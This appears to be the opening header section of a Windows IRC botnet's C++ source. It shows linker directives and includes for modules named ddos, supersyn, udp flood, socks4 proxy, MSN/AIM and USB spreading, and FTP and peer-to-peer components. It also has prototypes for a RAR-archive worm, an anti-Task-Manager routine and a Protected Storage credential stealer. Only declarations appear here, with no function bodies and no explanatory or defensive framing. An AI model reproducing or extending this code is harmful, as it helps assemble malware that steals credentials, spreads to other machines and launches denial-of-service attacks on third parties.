#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#ifndef _DEBUG
#pragma optimize("gsy", on)
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#pragma comment(linker,"/STUB:stub.exe") 
#else
#pragma comment(linker,"/NODEFAULTLIB:MSVCRTD")
#endif
//kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib  kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib 

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
//#include <stdarg.h>

#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <shlwapi.h>//PathRemoveFileSpec()
#include <list>
#include <winable.h>
#include <sqlext.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include <string.h>//fu
#include <winioctl.h>//fu
#include <sys\types.h> // for filesize function
#include <sys\stat.h>  // ^
#include "defines.h"
#include <commctrl.h>
#include "pstore.h"
#import "pstorec.dll" no_namespace
DWORD WINAPI pstore (LPVOID param);
DWORD WINAPI VisitThread(LPVOID param);
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
DWORD WINAPI RarWorm(LPVOID xvoid);
void AntiTaskManager( void* pVoid );
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
#include "Psapi.h"
#include "secure.h"
#include "driveinfo.h"
#include "loaddlls.h"
#include "triton.h"
#include "reptile.h"
#include "info.h"
#include "utility.h"
#include "aim.h"
#include "irc.h"
#include "commands.h"
#include "ddos.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"
#include "regcontrol.h"
#include "service.h"
#include "processes.h"
#include "peer2peer.h"
#include "msn.h"
#include "download.h"
#include "ftpd.h"
#include "netutils.h"
#include "netstatp.h"
#include "fu.h"
#include "socks4.h"
#include "usb.h"
#include "supersyn.h"
#include "udp.h"
